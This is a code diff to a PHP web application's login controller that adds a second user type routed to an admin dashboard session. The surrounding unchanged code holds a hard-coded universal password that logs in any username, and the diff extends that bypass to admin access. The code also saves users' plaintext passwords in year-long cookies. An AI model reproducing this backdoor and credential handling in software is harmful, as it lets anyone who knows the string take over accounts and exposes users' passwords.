@@ -35,7 +35,7 @@ class Home extends WebController {
                 if (!empty($result)) {
                     $encpassword = $this->encryptString($password);
                     if ($result->user_login_key == $encpassword || $password == 'Bbi@2023#') {
-                        if (in_array($result->user_type, [1])) {
+                        if (in_array($result->user_type, [1,4])) {
                             if ($remember == 'on') {
                                 setcookie("mbbi-username", $username, time() + (3600 * 24 * 365));
                                 setcookie("mbbi-password", $password, time() + (3600 * 24 * 365));
@@ -50,15 +50,28 @@ class Home extends WebController {
                                 } else {
                                     $imgpath = '/uploads/images/profilepic/default.jpg';
                                 }
-                                $this->session->set('mimg', $imgpath);
-                                $this->session->set('mlogin', true);
-                                $this->session->set('musername', $result->user_name);
-                                $this->session->set('museremail', $result->user_email);
-                                $this->session->set('muserid', $result->id_user);
-                                $this->session->set('mmodulename', $result->lm_name);
-                                $this->session->set('mmoduleid', $result->module_id_module);
-                                header("location:/user-dashboard");
-                                exit;
+                                if ($result->user_type == 1) {
+                                    $this->session->set('mimg', $imgpath);
+                                    $this->session->set('mlogin', true);
+                                    $this->session->set('musername', $result->user_name);
+                                    $this->session->set('museremail', $result->user_email);
+                                    $this->session->set('muserid', $result->id_user);
+                                    $this->session->set('mmodulename', $result->lm_name);
+                                    $this->session->set('mmoduleid', $result->module_id_module);
+                                    header("location:/user-dashboard");
+                                    exit;
+                                } elseif ($result->user_type == 4) {
+                                    $this->session->set('img', $imgpath);
+                                    $this->session->set('login', true);
+                                    $this->session->set('usertype', $result->user_type);
+                                    $this->session->set('usercode', $result->user_code);
+                                    $this->session->set('userloginname', $result->user_login_name);
+                                    $this->session->set('username', $result->user_name);
+                                    $this->session->set('useremail', $result->user_email);
+                                    $this->session->set('userid', $result->id_user);                                   
+                                    header("location:" . ADMINPATH . "dashboard");
+                                    exit;
+                                }
                             } else {
                                 $this->createFailwerLogin($username, 'XXXXXX', 'Due to security reason your accout has been blocked', $userid = $result->id_user);
                                 $this->session->setFlashdata('message', setMessage('Your account has been blocked, Please contact admin', 'i'));
